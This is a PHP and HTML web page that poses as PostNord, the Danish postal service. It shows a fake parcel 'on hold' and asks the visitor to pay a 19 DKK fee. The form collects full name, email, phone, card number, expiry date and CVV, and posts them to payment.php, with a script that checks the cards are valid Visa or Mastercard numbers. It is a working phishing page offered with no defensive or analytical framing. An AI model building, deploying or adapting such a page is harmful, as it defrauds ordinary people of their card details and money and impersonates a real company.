<?php
// PHP and validation logic here...

$packageNumber = "00357030308006520314";
$packageLength = "229 cm";
$packageWidth = "222 cm";
$packageHeight = "159 cm";
$packageWeight = "1.02 kg";
$deliveryTime = "i morgen"; // "tomorrow" in Danish
$price = "19 DKK";
$packageStatus = "På hold"; // "On hold" in Danish
$error = "";

// ...form processing and validation...

?>

<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Betal Gebyrer - PostNord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            padding: 10px;
        }
        .header img {
            max-width: 100%;
            height: auto;
            background-color: transparent; /* Transparent background for logo */
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input[type='text'],
        .form-group input[type='email'],
        .form-group input[type='tel'],
        .form-group input[type='number'] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        .form-group input[type='submit'] {
            background-color: #00A0D0; /* Updated button color */
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }
        .form-group input[type='submit']:hover {
            background-color: #008cb0;
        }
        .error {
            color: red;
            margin-bottom: 15px;
        }
        .package-details {
            background-color: #e6e6e6;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .package-details p {
            margin: 5px 0; /* Compact display of package details */
        }
        .status {
            color: #D50000; /* Red color for status */
            font-weight: bold;
        }
        /* Responsive Design */
        @media only screen and (max-width: 600px) {
            .container {
                width: 95%;
                padding: 10px;
            }
            .form-group input[type='submit'] {
                padding: 8px 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/PostNord_wordmark.svg" alt="PostNord Logo" style="max-width: 200px;">
        </div>

        <?php if (!empty($error)): ?>
            <p class="error"><?= $error ?></p>
        <?php endif; ?>

        <div class="package-details">
            <h3>Pakkeoplysninger:</h3>
            <p class="status">Status: <?= $packageStatus ?></p>
            <p>Pakkenummer: <?= $packageNumber ?></p>
            <p>Længde: <?= $packageLength ?></p>
            <p>Bredde: <?= $packageWidth ?></p>
            <p>Højde: <?= $packageHeight ?></p>
            <p>Vægt: <?= $packageWeight ?></p>
            <p>Leveringstid: <?= $deliveryTime ?></p>
            <p>Pris: <?= $price ?></p>
        </div>

        <form method="post" action="payment.php" onsubmit="return validateForm()">
            <div class="form-group">
                <label for="fullName">Fulde navn:</label>
                <input type="text" id="fullName" name="fullName" required>
            </div>

            <div class="form-group">
                <label for="email">Email:</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="form-group">
                <label for="phone">Telefonnummer:</label>
                <input type="tel" id="phone" name="phone" required>
            </div>

            <div class="form-group">
                <label for="cardNumber">Kortnummer:</label>
                <input type="number" id="cardNumber" name="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" required>
            </div>

            <div class="form-group">
                <label for="cardExpiry">Udløbsdato (MM/ÅÅ):</label>
                <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/ÅÅ" maxlength="5" required>
            </div>

            <div class="form-group">
                <label for="cvv">CVV:</label>
                <input type="number" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
            </div>

            <div class="form-group">
                <input type="submit" value="Betal Gebyrer">
            </div>
        </form>
    </div>

<script>
    function validateForm() {
        var cardNumber = document.getElementById('cardNumber').value;
        var cardExpiry = document.getElementById('cardExpiry').value;
        var currentYear = new Date().getFullYear() % 100; // Get the last two digits of the current year
        var currentMonth = new Date().getMonth() + 1; // Get current month (1-12)

        // Validate Card Number (Visa or MasterCard)
        if (!validateCardNumber(cardNumber)) {
            alert("Ugyldigt kortnummer. Kun Visa og Mastercard accepteres.");
            return false;
        }

        // Validate Expiry Date
        var expiryParts = cardExpiry.split('/');
        var expMonth = parseInt(expiryParts[0], 10);
        var expYear = parseInt(expiryParts[1], 10);

        if (!(expMonth >= 1 && expMonth <= 12) || expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
            alert("Ugyldig udløbsdato eller kortet er udløbet.");
            return false;
        }

        // Additional validations...
        return true;
    }

    // Function to validate the card number
    function validateCardNumber(number) {
        var regex = new RegExp("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$");
        return regex.test(number.replace(/\s+/g, '')); // Remove spaces and test
    }

    // Automatic '/' insertion for card expiry
    document.getElementById('cardExpiry').addEventListener('input', function (e) {
        var input = e.target.value;
        if (input.length === 2 && !input.includes('/')) {
            e.target.value = input + '/';
        }
    });
</script>
</body>
</html>
